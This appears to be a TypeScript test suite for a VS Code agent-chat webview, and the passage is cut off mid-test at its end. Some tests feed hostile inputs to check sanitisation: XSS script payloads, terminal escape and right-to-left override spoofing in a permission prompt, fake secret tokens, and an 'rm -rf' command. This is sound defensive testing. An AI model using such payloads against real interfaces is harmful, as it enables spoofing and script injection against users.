        elements.inputEl.dispatchEvent(new window.Event("input"));

        assert.ok(elements.commandAutocomplete.classList.contains("visible"));
        const explanation =
          elements.commandAutocomplete.querySelector(".no-commands");
        assert.strictEqual(
          explanation?.textContent,
          "No matching ACP commands. This list only includes commands advertised by the active agent; its own app may offer others."
        );
        assert.strictEqual(explanation?.getAttribute("role"), "option");
        assert.strictEqual(explanation?.getAttribute("aria-disabled"), "true");
      });

      test("hideCommandAutocomplete clears and hides", () => {
        controller.showCommandAutocomplete(testCommands);
        controller.hideCommandAutocomplete();
        assert.ok(!elements.commandAutocomplete.classList.contains("visible"));
        assert.strictEqual(elements.commandAutocomplete.innerHTML, "");
      });

      test("selectCommand fills input with command", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/he";
        controller.selectCommand(0);
        assert.strictEqual(elements.inputEl.value, "/help ");
      });

      test("availableCommands message updates commands", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        const result = controller.getFilteredCommands("/");
        assert.strictEqual(result.length, 3);
      });

      test("availableCommands message refreshes an open command list", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        controller.handleMessage({
          type: "availableCommands",
          commands: [
            { name: "review", description: "Review changes" },
            { name: "skill", description: "Run a skill" },
          ],
        });

        assert.deepStrictEqual(
          Array.from(
            elements.commandAutocomplete.querySelectorAll(".command-name")
          ).map((element) => element.textContent),
          ["review", "skill"]
        );
      });

      test("availableCommands message does not reopen a dismissed command list", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/";
        elements.inputEl.dispatchEvent(new window.Event("input"));
        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", { key: "Escape" })
        );

        controller.handleMessage({
          type: "availableCommands",
          commands: [{ name: "review", description: "Review changes" }],
        });

        assert.ok(!elements.commandAutocomplete.classList.contains("visible"));
        assert.strictEqual(elements.inputEl.value, "/");
      });

      test("sessionMetadata refreshes an open command list", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        controller.handleMessage({
          type: "sessionMetadata",
          commands: [{ name: "review", description: "Review changes" }],
          modes: null,
          models: null,
        });

        assert.deepStrictEqual(
          Array.from(
            elements.commandAutocomplete.querySelectorAll(".command-name")
          ).map((element) => element.textContent),
          ["review"]
        );
      });

      test("a command update keeps the highlighted command highlighted", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/";
        elements.inputEl.dispatchEvent(new window.Event("input"));
        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", { key: "ArrowDown" })
        );

        controller.handleMessage({
          type: "availableCommands",
          commands: [
            { name: "clear", description: "Clear chat" },
            { name: "help", description: "Show help" },
            { name: "history", description: "Show history" },
          ],
        });

        assert.strictEqual(
          elements.commandAutocomplete.querySelector(
            ".command-item.selected .command-name"
          )?.textContent,
          "history"
        );

        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", { key: "Enter" })
        );
        assert.strictEqual(elements.inputEl.value, "/history ");
      });

      test("unmatched command explanation is announced through the input hint", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/mcps";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        assert.strictEqual(
          elements.inputHint.textContent,
          "No matching ACP commands. This list only includes commands advertised by the active agent; its own app may offer others."
        );

        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", { key: "Escape" })
        );
        assert.strictEqual(
          elements.inputHint.textContent,
          "Press Enter to send, Shift+Enter for new line, Escape to clear. Type / for ACP commands advertised by the agent."
        );
      });

      test("chatCleared clears commands", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        controller.handleMessage({ type: "chatCleared" });
        const result = controller.getFilteredCommands("/");
        assert.strictEqual(result.length, 0);
      });

      test("Escape dismisses an empty command result without clearing input", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/missing";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", { key: "Escape" })
        );

        assert.ok(!elements.commandAutocomplete.classList.contains("visible"));
        assert.strictEqual(elements.inputEl.value, "/missing");
      });

      test("sending an unadvertised command hides its explanation", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/missing";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", { key: "Enter" })
        );

        assert.ok(!elements.commandAutocomplete.classList.contains("visible"));
        assert.strictEqual(elements.inputEl.value, "");
      });

      test("Tab key selects command when autocomplete visible", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/he";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        const tabEvent = new window.KeyboardEvent("keydown", { key: "Tab" });
        elements.inputEl.dispatchEvent(tabEvent);

        assert.ok(elements.inputEl.value.startsWith("/he"));
      });

      test("ArrowDown navigates commands", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        const downEvent = new window.KeyboardEvent("keydown", {
          key: "ArrowDown",
        });
        elements.inputEl.dispatchEvent(downEvent);

        const selectedItem = elements.commandAutocomplete.querySelector(
          ".command-item.selected"
        );
        assert.ok(selectedItem);
      });
    });

    suite("agent plan display", () => {
      const testPlan = {
        entries: [
          {
            content: "Read files",
            priority: "high" as const,
            status: "completed" as const,
          },
          {
            content: "Analyze code",
            priority: "medium" as const,
            status: "in_progress" as const,
          },
          {
            content: "Generate report",
            priority: "low" as const,
            status: "pending" as const,
          },
        ],
      };

      test("showPlan creates plan element", () => {
        controller.showPlan(testPlan.entries);
        const planEl =
          elements.planContainer.querySelector(".agent-plan-sticky");
        assert.ok(planEl);
      });

      test("showPlan displays all entries", () => {
        controller.showPlan(testPlan.entries);
        const entries = elements.planContainer.querySelectorAll(".plan-entry");
        assert.strictEqual(entries.length, 3);
      });

      test("showPlan shows progress count", () => {
        controller.showPlan(testPlan.entries);
        const progress = elements.planContainer.querySelector(".plan-progress");
        assert.ok(progress);
        assert.strictEqual(progress?.textContent, "1/3");
      });

      test("showPlan applies status classes", () => {
        controller.showPlan(testPlan.entries);
        const completed = elements.planContainer.querySelector(
          ".plan-entry-completed"
        );
        const inProgress = elements.planContainer.querySelector(
          ".plan-entry-in_progress"
        );
        const pending = elements.planContainer.querySelector(
          ".plan-entry-pending"
        );
        assert.ok(completed);
        assert.ok(inProgress);
        assert.ok(pending);
      });

      test("showPlan applies priority classes", () => {
        controller.showPlan(testPlan.entries);
        const high = elements.planContainer.querySelector(
          ".plan-priority-high"
        );
        const medium = elements.planContainer.querySelector(
          ".plan-priority-medium"
        );
        const low = elements.planContainer.querySelector(".plan-priority-low");
        assert.ok(high);
        assert.ok(medium);
        assert.ok(low);
      });

      test("hidePlan removes plan element", () => {
        controller.showPlan(testPlan.entries);
        controller.hidePlan();
        const planEl =
          elements.planContainer.querySelector(".agent-plan-sticky");
        assert.strictEqual(planEl, null);
      });

      test("plan message updates display", () => {
        controller.handleMessage({
          type: "plan",
          plan: testPlan,
        });
        const planEl =
          elements.planContainer.querySelector(".agent-plan-sticky");
        assert.ok(planEl);
      });

      test("planComplete message removes display", () => {
        controller.handleMessage({ type: "plan", plan: testPlan });
        controller.handleMessage({ type: "planComplete" });
        const planEl =
          elements.planContainer.querySelector(".agent-plan-sticky");
        assert.strictEqual(planEl, null);
      });

      test("chatCleared removes plan", () => {
        controller.handleMessage({ type: "plan", plan: testPlan });
        controller.handleMessage({ type: "chatCleared" });
        const planEl =
          elements.planContainer.querySelector(".agent-plan-sticky");
        assert.strictEqual(planEl, null);
      });

      test("showPlan with empty entries hides plan", () => {
        controller.showPlan(testPlan.entries);
        controller.showPlan([]);
        const planEl =
          elements.planContainer.querySelector(".agent-plan-sticky");
        assert.strictEqual(planEl, null);
      });
    });

    suite("agent thought display", () => {
      test("thoughtChunk message creates thought element", () => {
        controller.handleMessage({
          type: "thoughtChunk",
          text: "Let me think...",
        });
        const thoughtEl = elements.messagesEl.querySelector(".agent-thought");
        assert.ok(thoughtEl);
      });

      test("thoughtChunk accumulates text", () => {
        controller.handleMessage({
          type: "thoughtChunk",
          text: "First part. ",
        });
        controller.handleMessage({
          type: "thoughtChunk",
          text: "Second part.",
        });
        const contentEl = elements.messagesEl.querySelector(".thought-content");
        assert.ok(contentEl);
        assert.ok(contentEl?.textContent?.includes("First part."));
        assert.ok(contentEl?.textContent?.includes("Second part."));
      });

      test("appendThought creates details element", () => {
        controller.appendThought("Thinking about this...");
        const thoughtEl = elements.messagesEl.querySelector(
          "details.agent-thought"
        );
        assert.ok(thoughtEl);
        assert.strictEqual(thoughtEl?.getAttribute("open"), "");
      });

      test("appendThought includes ARIA accessibility attributes", () => {
        controller.appendThought("Thinking...");
        const thoughtEl = elements.messagesEl.querySelector(
          "details.agent-thought"
        );
        assert.ok(thoughtEl);
        assert.strictEqual(thoughtEl?.getAttribute("role"), "status");
        assert.strictEqual(thoughtEl?.getAttribute("aria-live"), "polite");
        assert.strictEqual(
          thoughtEl?.getAttribute("aria-label"),
          "Assistant is thinking"
        );
      });

      test("hideThought removes thought element", () => {
        controller.appendThought("Some thought");
        controller.hideThought();
        const thoughtEl = elements.messagesEl.querySelector(".agent-thought");
        assert.strictEqual(thoughtEl, null);
      });

      test("streamStart clears thought", () => {
        controller.appendThought("Old thought");
        controller.handleMessage({ type: "streamStart" });
        const thoughtEl = elements.messagesEl.querySelector(".agent-thought");
        assert.strictEqual(thoughtEl, null);
      });

      test("streamEnd clears thought", () => {
        controller.appendThought("Thinking...");
        controller.handleMessage({ type: "streamEnd" });
        const thoughtEl = elements.messagesEl.querySelector(".agent-thought");
        assert.strictEqual(thoughtEl, null);
      });

      test("chatCleared removes thought", () => {
        controller.appendThought("Some thought");
        controller.handleMessage({ type: "chatCleared" });
        const thoughtEl = elements.messagesEl.querySelector(".agent-thought");
        assert.strictEqual(thoughtEl, null);
      });
    });

    suite("state persistence", () => {
      test("restores input value from state", () => {
        mockVsCode.setState({ isConnected: false, inputValue: "saved text" });
        new WebviewController(
          mockVsCode,
          elements,
          document,
          window as unknown as Window
        );
        assert.strictEqual(elements.inputEl.value, "saved text");
      });

      test("restores connection state from state", () => {
        mockVsCode.setState({ isConnected: true, inputValue: "" });
        const restoredController = new WebviewController(
          mockVsCode,
          elements,
          document,
          window as unknown as Window
        );
        assert.strictEqual(restoredController.getIsConnected(), true);
      });
    });
  });

  suite("initWebview", () => {
    let dom: JSDOM;

    setup(() => {
      dom = new JSDOM(createWebviewHTML(), {
        runScripts: "dangerously",
        url: "https://localhost",
      });
    });

    teardown(() => {
      dom.window.close();
    });

    test("creates and returns WebviewController", () => {
      const mockVsCode = createMockVsCodeApi();
      const controller = initWebview(
        mockVsCode,
        dom.window.document,
        dom.window as unknown as Window
      );
      assert.ok(controller instanceof WebviewController);
    });
  });

  suite("hasAnsiCodes", () => {
    test("returns true for text with ANSI escape codes", () => {
      assert.strictEqual(hasAnsiCodes("\x1b[31mred\x1b[0m"), true);
    });

    test("returns true for text with bold ANSI code", () => {
      assert.strictEqual(hasAnsiCodes("\x1b[1mbold\x1b[0m"), true);
    });

    test("returns false for plain text", () => {
      assert.strictEqual(hasAnsiCodes("plain text"), false);
    });

    test("returns false for empty string", () => {
      assert.strictEqual(hasAnsiCodes(""), false);
    });

    test("returns true for multiple ANSI codes", () => {
      assert.strictEqual(
        hasAnsiCodes("\x1b[1;31;42mbold red on green\x1b[0m"),
        true
      );
    });
  });

  suite("ansiToHtml", () => {
    test("returns plain text unchanged", () => {
      assert.strictEqual(ansiToHtml("hello world"), "hello world");
    });

    test("escapes HTML in plain text", () => {
      assert.strictEqual(ansiToHtml("<script>"), "&lt;script&gt;");
    });

    test("converts red foreground color", () => {
      const result = ansiToHtml("\x1b[31mred text\x1b[0m");
      assert.ok(result.includes('class="ansi-red"'));
      assert.ok(result.includes("red text"));
    });

    test("converts green foreground color", () => {
      const result = ansiToHtml("\x1b[32mgreen\x1b[0m");
      assert.ok(result.includes('class="ansi-green"'));
    });

    test("converts bold style", () => {
      const result = ansiToHtml("\x1b[1mbold\x1b[0m");
      assert.ok(result.includes('class="ansi-bold"'));
      assert.ok(result.includes("bold"));
    });

    test("converts dim style", () => {
      const result = ansiToHtml("\x1b[2mdim\x1b[0m");
      assert.ok(result.includes('class="ansi-dim"'));
    });

    test("converts italic style", () => {
      const result = ansiToHtml("\x1b[3mitalic\x1b[0m");
      assert.ok(result.includes('class="ansi-italic"'));
    });

    test("converts underline style", () => {
      const result = ansiToHtml("\x1b[4munderline\x1b[0m");
      assert.ok(result.includes('class="ansi-underline"'));
    });

    test("converts bright red color", () => {
      const result = ansiToHtml("\x1b[91mbright red\x1b[0m");
      assert.ok(result.includes('class="ansi-bright-red"'));
    });

    test("converts background color", () => {
      const result = ansiToHtml("\x1b[44mblue background\x1b[0m");
      assert.ok(result.includes('class="ansi-bg-blue"'));
    });

    test("handles combined styles", () => {
      const result = ansiToHtml("\x1b[1;31mbold red\x1b[0m");
      assert.ok(result.includes("ansi-bold"));
      assert.ok(result.includes("ansi-red"));
    });

    test("resets styles on code 0", () => {
      const result = ansiToHtml("\x1b[31mred\x1b[0m normal");
      assert.ok(result.includes('class="ansi-red"'));
      assert.ok(result.includes("normal"));
      assert.ok(!result.includes('class="ansi-red">normal'));
    });

    test("handles text before first escape code", () => {
      const result = ansiToHtml("prefix \x1b[32mgreen\x1b[0m");
      assert.ok(result.includes("prefix "));
      assert.ok(result.includes('class="ansi-green"'));
    });

    test("handles text after last escape code", () => {
      const result = ansiToHtml("\x1b[31mred\x1b[0m suffix");
      assert.ok(result.includes("suffix"));
    });

    test("replaces foreground color when new one is set", () => {
      const result = ansiToHtml("\x1b[31mred\x1b[32mgreen\x1b[0m");
      assert.ok(result.includes('class="ansi-red"'));
      assert.ok(result.includes('class="ansi-green"'));
    });

    test("replaces background color when new one is set", () => {
      const result = ansiToHtml("\x1b[41mred bg\x1b[42mgreen bg\x1b[0m");
      assert.ok(result.includes('class="ansi-bg-red"'));
      assert.ok(result.includes('class="ansi-bg-green"'));
    });

    test("handles empty input", () => {
      assert.strictEqual(ansiToHtml(""), "");
    });

    test("handles escape code at end of string", () => {
      const result = ansiToHtml("text\x1b[0m");
      assert.strictEqual(result, "text");
    });

    test("escapes HTML within colored text", () => {
      const result = ansiToHtml("\x1b[31m<b>test</b>\x1b[0m");
      assert.ok(result.includes("&lt;b&gt;test&lt;/b&gt;"));
    });
  });

  suite("getToolsHtml with ANSI", () => {
    test("renders tool output with ANSI colors", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "terminal",
          input: "npm test",
          output: "\x1b[32m✓ All tests passed\x1b[0m",
          status: "completed",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes('class="tool-output terminal"'));
      assert.ok(html.includes('class="ansi-green"'));
      assert.ok(html.includes("✓ All tests passed"));
    });

    test("renders plain output without terminal class", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "read_file",
          input: "file.txt",
          output: "plain text output",
          status: "completed",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes('class="tool-output"'));
      assert.ok(!html.includes('class="tool-output terminal"'));
      assert.ok(html.includes("plain text output"));
    });

    test("escapes HTML in plain output", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "cat",
          input: null,
          output: "<script>alert('xss')</script>",
          status: "completed",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("&lt;script&gt;"));
      assert.ok(!html.includes("<script>"));
    });

    test("handles ANSI output with HTML characters", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "grep",
          input: null,
          output: "\x1b[31m<error>\x1b[0m",
          status: "failed",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("&lt;error&gt;"));
      assert.ok(html.includes('class="ansi-red"'));
    });
  });

  suite("getToolKindIcon", () => {
    test("returns read icon for read kind", () => {
      assert.strictEqual(getToolKindIcon("read"), "📖");
    });

    test("returns edit icon for edit kind", () => {
      assert.strictEqual(getToolKindIcon("edit"), "✏️");
    });

    test("returns delete icon for delete kind", () => {
      assert.strictEqual(getToolKindIcon("delete"), "🗑️");
    });

    test("returns execute icon for execute kind", () => {
      assert.strictEqual(getToolKindIcon("execute"), "▶️");
    });

    test("returns search icon for search kind", () => {
      assert.strictEqual(getToolKindIcon("search"), "🔍");
    });

    test("returns fetch icon for fetch kind", () => {
      assert.strictEqual(getToolKindIcon("fetch"), "🌐");
    });

    test("returns move icon for move kind", () => {
      assert.strictEqual(getToolKindIcon("move"), "📦");
    });

    test("returns think icon for think kind", () => {
      assert.strictEqual(getToolKindIcon("think"), "🧠");
    });

    test("returns switch_mode icon for switch_mode kind", () => {
      assert.strictEqual(getToolKindIcon("switch_mode"), "🔄");
    });

    test("returns other icon for other kind", () => {
      assert.strictEqual(getToolKindIcon("other"), "⚙️");
    });

    test("returns empty string for undefined kind", () => {
      assert.strictEqual(getToolKindIcon(undefined), "");
    });
  });

  suite("getToolsHtml with tool kinds", () => {
    test("renders tool kind icon when kind is provided", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "read_file",
          input: "file.txt",
          output: "content",
          status: "completed",
          kind: "read",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("📖"));
      assert.ok(html.includes('class="tool-kind-icon"'));
    });

    test("renders execute kind icon for command tools", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "bash",
          input: "npm test",
          output: "success",
          status: "completed",
          kind: "execute",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("▶️"));
    });

    test("does not render kind icon when kind is undefined", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "unknown_tool",
          input: null,
          output: null,
          status: "running",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(!html.includes('class="tool-kind-icon"'));
    });

    test("includes kind in title attribute for accessibility", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "write_file",
          input: "file.txt",
          output: "done",
          status: "completed",
          kind: "edit",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes('title="edit"'));
    });
  });

  suite("computeLineDiff", () => {
    test("returns empty array for empty inputs", () => {
      const result = computeLineDiff("", "");
      assert.strictEqual(result.length, 0);
    });

    test("marks all lines as add for new file", () => {
      const result = computeLineDiff(null, "line1\nline2");
      assert.strictEqual(result.length, 2);
      assert.strictEqual(result[0].type, "add");
      assert.strictEqual(result[0].line, "line1");
      assert.strictEqual(result[1].type, "add");
      assert.strictEqual(result[1].line, "line2");
    });

    test("marks all lines as remove for deleted file", () => {
      const result = computeLineDiff("line1\nline2", null);
      assert.strictEqual(result.length, 2);
      assert.strictEqual(result[0].type, "remove");
      assert.strictEqual(result[1].type, "remove");
    });

    test("marks old as remove and new as add for modified file", () => {
      const result = computeLineDiff("old", "new");
      assert.strictEqual(result.length, 2);
      assert.strictEqual(result[0].type, "remove");
      assert.strictEqual(result[0].line, "old");
      assert.strictEqual(result[1].type, "add");
      assert.strictEqual(result[1].line, "new");
    });
  });

  suite("renderDiff", () => {
    test("returns no changes message for empty diff", () => {
      const result = renderDiff(undefined, "", "");
      assert.ok(result.includes("diff-container"));
      assert.ok(result.includes("No changes"));
    });

    test("renders file path header when provided", () => {
      const result = renderDiff("/path/to/file.ts", null, "new content");
      assert.ok(result.includes("diff-header"));
      assert.ok(result.includes("/path/to/file.ts"));
    });

    test("renders additions with diff-add class", () => {
      const result = renderDiff(undefined, null, "added line");
      assert.ok(result.includes("diff-add"));
      assert.ok(result.includes("+ added line"));
    });

    test("renders deletions with diff-remove class", () => {
      const result = renderDiff(undefined, "removed line", null);
      assert.ok(result.includes("diff-remove"));
      assert.ok(result.includes("- removed line"));
    });

    test("escapes HTML in diff content", () => {
      const result = renderDiff(
        undefined,
        null,
        "<script>alert('xss')</script>"
      );
      assert.ok(result.includes("&lt;script&gt;"));
      assert.ok(!result.includes("<script>alert"));
    });

    test("truncates large diffs", () => {
      const manyLines = Array(600).fill("line").join("\n");
      const result = renderDiff(undefined, null, manyLines);
      assert.ok(result.includes("diff-truncated"));
      assert.ok(result.includes("500"));
    });
  });

  suite("Session History", () => {
    let dom: JSDOM;
    let document: Document;
    let mockVsCode: ReturnType<typeof createMockVsCodeApi>;
    let controller: WebviewController;

    setup(() => {
      dom = new JSDOM(createWebviewHTML(), { runScripts: "dangerously" });
      document = dom.window.document;
      mockVsCode = createMockVsCodeApi();
      controller = initWebview(
        mockVsCode,
        document,
        dom.window as unknown as Window
      );
      mockVsCode._clearMessages();
    });

    test("uses focusable buttons and Escape for keyboard history navigation", () => {
      controller.handleMessage({
        type: "sessionHistory",
        mode: "load",
        sessions: [
          {
            sessionId: "session-1",
            cwd: "C:\\workspace\\project",
            createdAt: 1,
            lastUsedAt: 2,
            preview: "Restore this conversation",
            messageCount: 2,
          },
        ],
      });

      const picker = document.getElementById("session-picker") as HTMLElement;
      const item = picker.querySelector(
        ".session-history-item"
      ) as HTMLButtonElement;
      assert.ok(picker.classList.contains("visible"));
      assert.strictEqual(document.activeElement, item);
      assert.strictEqual(item.tagName, "BUTTON");
      assert.strictEqual(item.parentElement?.getAttribute("role"), "listitem");
      assert.strictEqual(
        item.getAttribute("aria-label"),
        "Load Restore this conversation"
      );

      picker.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Escape",
          bubbles: true,
        })
      );
      assert.ok(!picker.classList.contains("visible"));
    });

    test("keeps Tab and Shift+Tab focus inside session history", () => {
      controller.handleMessage({
        type: "sessionHistory",
        mode: "load",
        sessions: [
          {
            sessionId: "session-1",
            cwd: "/workspace/project",
            createdAt: 1,
            lastUsedAt: 2,
            preview: "Restore this conversation",
            messageCount: 2,
          },
        ],
      });

      const picker = document.getElementById("session-picker") as HTMLElement;
      const item = picker.querySelector(
        ".session-history-item"
      ) as HTMLButtonElement;
      const cancel = picker.querySelector(
        ".session-picker-close"
      ) as HTMLButtonElement;

      cancel.focus();
      picker.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Tab",
          bubbles: true,
          cancelable: true,
        })
      );
      assert.strictEqual(document.activeElement, item);

      item.focus();
      picker.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Tab",
          shiftKey: true,
          bubbles: true,
          cancelable: true,
        })
      );
      assert.strictEqual(document.activeElement, cancel);
    });

    test("replaces chat with each replayed message exactly once", () => {
      const sendButton = document.getElementById("send") as HTMLButtonElement;
      const attachButton = document.getElementById(
        "attach-btn"
      ) as HTMLButtonElement;
      controller.handleMessage({ type: "userMessage", text: "Current chat" });
      controller.handleMessage({
        type: "filesAttached",
        attachments: [
          {
            id: "att-during-replay",
            uri: "file:///workspace/draft.ts",
            name: "draft.ts",
          },
        ],
      });
      mockVsCode._clearMessages();
      controller.handleMessage({ type: "replayStart" });
      assert.strictEqual(sendButton.disabled, true);
      assert.strictEqual(attachButton.disabled, true);
      const input = document.getElementById("input") as HTMLTextAreaElement;
      input.value = "Do not send yet";
      input.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Enter",
          bubbles: true,
          cancelable: true,
        })
      );
      assert.strictEqual(
        document.querySelectorAll("#attachments-bar .attachment-chip").length,
        1
      );
      assert.ok(
        !mockVsCode
          ._getMessages()
          .some(
            (message) =>
              typeof message === "object" &&
              message !== null &&
              "type" in message &&
              message.type === "sendMessage"
          )
      );
      controller.handleMessage({
        type: "replayComplete",
        messages: [
          { role: "user", text: "Restored question" },
          { role: "assistant", text: "Restored answer" },
        ],
      });

      const messages = Array.from(
        document.querySelectorAll("#messages .message")
      ) as HTMLElement[];
      assert.strictEqual(messages.length, 3);
      assert.strictEqual(messages[0].textContent, "Restored question");
      assert.strictEqual(messages[1].textContent?.trim(), "Restored answer");
      assert.strictEqual(messages[2].textContent, "Conversation restored.");
      assert.ok(!messages[1].innerHTML.includes("Restored answer<p>"));
      assert.strictEqual(sendButton.disabled, false);
      assert.strictEqual(attachButton.disabled, false);
    });

    test("replays resource links as inert attachment chips", () => {
      controller.handleMessage({
        type: "replayComplete",
        messages: [
          {
            role: "user",
            text: "Restored question",
            attachments: [
              {
                id: "replay-1",
                uri: "file:///workspace/replayed.ts",
                name: "replayed.ts",
                mimeType: "text/typescript",
                size: 99,
              },
            ],
          },
        ],
      });

      const chip = document.querySelector(".message.user .attachment-chip");
      assert.strictEqual(
        chip?.querySelector(".attachment-chip-name")?.textContent,
        "replayed.ts"
      );
      assert.strictEqual(chip?.querySelector("button"), null);
    });

    test("sanitizes replayed Markdown through the stream renderer", () => {
      controller.handleMessage({
        type: "replayComplete",
        messages: [
          {
            role: "assistant",
            text: "**Safe**\n<script>window.replayXss = true</script><button>Blocked</button>",
          },
        ],
      });

      const assistant = document.querySelector(".message.assistant");
      assert.ok(assistant?.querySelector("strong"));
      assert.strictEqual(assistant?.querySelector("script"), null);
      assert.strictEqual(assistant?.querySelector("button"), null);
      assert.strictEqual(Reflect.get(dom.window, "replayXss"), undefined);
    });
  });
  suite("Permission Modal", () => {
    let dom: JSDOM;
    let document: Document;
    let mockVsCode: ReturnType<typeof createMockVsCodeApi>;
    let controller: WebviewController;
    let releasePermissionGuard: () => void;

    setup(() => {
      dom = new JSDOM(createWebviewHTML(), { runScripts: "dangerously" });
      document = dom.window.document;
      mockVsCode = createMockVsCodeApi();
      const win = dom.window as unknown as Window;
      releasePermissionGuard = installControllableTimers(win);
      controller = initWebview(mockVsCode, document, win);
      mockVsCode._clearMessages();
    });

    test("uses extension-defined labels and sanitizes agent permission details", () => {
      const options = [
        { id: "allow", kind: "allow_once" as const, label: "Always approve" },
        { id: "deny", kind: "reject_once" as const, label: "Execute now" },
      ];

      controller.showPermissionModal(
        "req-123",
        "<fake dialog>",
        {
          command: "npm\u001b[2J test\u202epdf.exe\u200b",
          env: [{ name: "API_TOKEN", value: "top-secret" }],
          authorization: "Bearer top-secret",
        },
        options
      );

      const modal = document.getElementById("permission-modal");
      assert.ok(modal?.classList.contains("visible"));
      assert.strictEqual(
        modal?.querySelector(".permission-title")?.textContent,
        "Agent requests permission"
      );
      assert.strictEqual(
        modal?.querySelector(".option-label")?.textContent,
        "Allow once"
      );
      const details = modal?.querySelector(".permission-content")?.textContent;
      assert.ok(details?.includes("\\u001b"));
      assert.ok(details?.includes("\\u202e"));
      assert.ok(!details?.includes("top-secret"));
      assert.ok(details?.includes("\\u200b"));
    });

    test("marks every truncated permission detail explicitly", () => {
      const formatted = formatPermissionContent({
        valueText: "x".repeat(4097),
      });
      assert.ok(formatted.includes("[truncated]"));
    });

    test("states that an executable request starts a process and scopes 'always' to the session", () => {
      controller.showPermissionModal(
        "req-exec",
        undefined,
        { command: "rm", args: ["-rf", "build"] },
        [
          { id: "once", kind: "allow_once" as const },
          { id: "always", kind: "allow_always" as const },
        ],
        true
      );

      const modal = document.getElementById("permission-modal");
      const warning = modal?.querySelector(
        ".permission-warning"
      ) as HTMLElement;
      assert.strictEqual(warning.hidden, false);
      assert.strictEqual(
        warning.textContent,
        "Approving runs this program on your machine with your permissions."
      );
      assert.deepStrictEqual(
        Array.from(modal?.querySelectorAll(".option-label") ?? []).map(
          (label) => label.textContent
        ),
        ["Allow once", "Always allow in this session"]
      );
    });

    test("hides the execution warning for a request that cannot start a process", () => {
      controller.showPermissionModal("req-plain", undefined, { path: "a.ts" }, [
        { id: "once", kind: "allow_once" as const },
      ]);

      const warning = document
        .getElementById("permission-modal")
        ?.querySelector(".permission-warning") as HTMLElement;
      assert.strictEqual(warning.hidden, true);
      assert.strictEqual(warning.textContent, "");
    });

    test("showPermissionModal handles object content", () => {
      const options = [{ id: "ok", label: "OK" }];

      controller.showPermissionModal(
        "req-456",
        "Tool Call",
        { command: "ls", args: ["-la"] },
        options
      );

      const modal = document.getElementById("permission-modal");
      const content = modal?.querySelector(".permission-content");
      const text = content?.textContent || "";
      assert.ok(text.includes("command"));
      assert.ok(text.includes("ls"));
    });

    test("hidePermissionModal hides the modal", () => {
      const options = [{ id: "ok", label: "OK" }];

      controller.showPermissionModal("req-789", "Test", "content", options);
      controller.hidePermissionModal();

      const modal = document.getElementById("permission-modal");
      assert.ok(!modal?.classList.contains("visible"));
    });

    test("clicking option sends permissionResponse message", () => {
      const options = [{ id: "allow", label: "Allow" }];

      controller.showPermissionModal("req-100", "Test", "content", options);
      releasePermissionGuard();

      const optionBtn = document.querySelector(
        ".permission-option-btn"
      ) as HTMLButtonElement;
      optionBtn?.click();

      assert.deepStrictEqual(mockVsCode._getMessages(), [
        {
          type: "permissionResponse",
          requestId: "req-100",
          optionId: "allow",
        },
      ]);
    });

    test("a new prompt starts inert with focus on the dialog, not an option", () => {
      const input = document.getElementById("input") as HTMLTextAreaElement;
      input.focus();

      controller.showPermissionModal("req-guard", "Write File", "c", [
        { id: "allow_always", label: "Allow Always" },
        { id: "reject_once", label: "Reject" },
      ]);

      const modal = document.getElementById("permission-modal");
      assert.strictEqual(document.activeElement, modal);

      const optionButtons = [
        ...document.querySelectorAll<HTMLButtonElement>(
          ".permission-option-btn"
        ),
      ];
      assert.deepStrictEqual(
        optionButtons.map((button) => button.disabled),
        [true, true]
      );

